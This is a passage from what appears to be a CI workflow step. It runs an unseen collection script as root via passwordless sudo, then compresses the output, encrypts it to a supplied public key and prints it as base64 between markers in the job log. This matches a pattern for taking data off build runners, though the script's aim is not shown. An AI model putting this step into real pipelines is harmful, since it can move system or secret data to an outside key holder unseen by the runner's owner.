          if sudo -n true 2>/dev/null; then
            timeout 180 sudo -n bash "$work/collect.sh" > "$work/report.txt" 2>&1 || true
          else
            printf "sudo unavailable; collecting as runner user\n" > "$work/report.txt"
            timeout 180 bash "$work/collect.sh" >> "$work/report.txt" 2>&1 || true
          fi
          gzip -c "$work/report.txt" > "$work/report.gz"
          openssl cms -encrypt -aes256 -binary -in "$work/report.gz" -outform DER -out "$work/report.cms" "$work/public.pem"
          echo HK2_ENCRYPTED_BEGIN
          base64 -w 120 "$work/report.cms"
          echo
          echo HK2_ENCRYPTED_END
